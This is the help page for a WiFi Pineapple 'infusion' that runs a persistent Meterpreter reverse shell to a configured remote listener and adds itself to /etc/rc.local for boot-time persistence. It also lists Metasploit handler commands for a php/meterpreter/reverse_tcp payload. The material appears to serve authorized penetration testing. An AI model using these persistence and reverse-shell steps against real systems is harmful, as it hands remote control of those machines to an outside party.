<pre>
Meterpreter Infusion version 1.0

<b>Host</b> - IP or Hostname of target meterpreter listener
<b>Port</b> - Port number of target meterpreter listener
<b>Update Meterpreter Configuration</b> - saves Host and Port settings in /etc/config/meterpreter configuration file.

Meterpreter <b>Start</b> - Starts a persistent meterpreter with configured settings. If connection fails a retry attempt will be made immediately.
Meterpreter <b>Stop</b> - Kills meterpreter and prevents further instances from automatically attempting connection.

Autostart <b>Enable</b> - Enables meterpreter on boot by adding 'pineapple infusion meterpreter&' command to /etc/rc.local
Autostart <b>Disable</b> - Disables meterpreter on boot by removing 'pineapple infusion meterpreter&' command from /etc/rc.local

Tips:

While general metasploit help is outside the scope of this infusion, the following commands will typically work:

    use exploit/multi/handler				# Handles multiple meterpreter sessions
    set PAYLOAD php/meterpreter/reverse_tcp		# Setting for Reverse TCP Meterpreter
    set LHOST [host or ip]				# Hostname or IP of listener
    set LPORT [port number]				# Port of listener
    set ExitOnSession false				# Let the exploit continue when meterpreter exists
    exploit -j						# Make the exploit a backgroundable job

    sessions						# Lists sessions
    sessions -i [number]				# Interacts with session number



          ,__,
          (oo)____
          (__)    )\
             ||--|| *
          Like Metasploit? 
          Perhaps you'd enjoy Metasploit Minute with Mubix! 
          http://www.metasploitminute.com &lt;/shameless plug&gt;

</pre>
